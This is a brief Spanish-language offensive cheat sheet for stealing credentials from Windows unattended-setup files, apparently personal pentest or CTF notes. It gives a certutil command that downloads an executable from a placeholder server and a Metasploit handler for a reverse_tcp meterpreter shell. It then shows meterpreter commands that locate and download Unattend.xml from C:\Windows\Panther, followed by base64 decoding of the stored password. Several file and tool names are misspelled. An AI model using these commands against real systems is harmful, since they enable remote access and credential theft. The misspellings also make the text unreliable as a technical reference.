Unatandent Windows Setup Utility?

```
C:\Windows\Panther\Unatted.xml

C:\Windows\Panther\Autounatted.xml
```

Los pass en estos archivos puede estar en base64 por lo que hay que decodificarlos

Desde un cmd hacer una descarga de un archivo en un servidor
```
certutil -urlcache -f http://ip/fichero.exe nombre.exe
```

```
mfsconsole
>use multi-handler
>set payload windows/x64/meterpreter/reverse_tcp
>set LPORT port
>set LHOST ip
>run
meterpreter>sysinfo
meterpreter> search -f Unattend.xml #Busca el fichero en la seccion de meterpreter ue estamos es decir en la pc windows que estamos y nos da donde esta el file

meterpreter>cd C:\\
meterpreter>cd Windows
meterpreter>cd Panther
meterpreter>dowload unattend.xml
```

Buscamos el el fichero el pass y el usuario y si esta en base64 lo decodificamos


```
nano password.txt #Agregamos el pass
base64 -d password.txt # Decodificamos el pass
```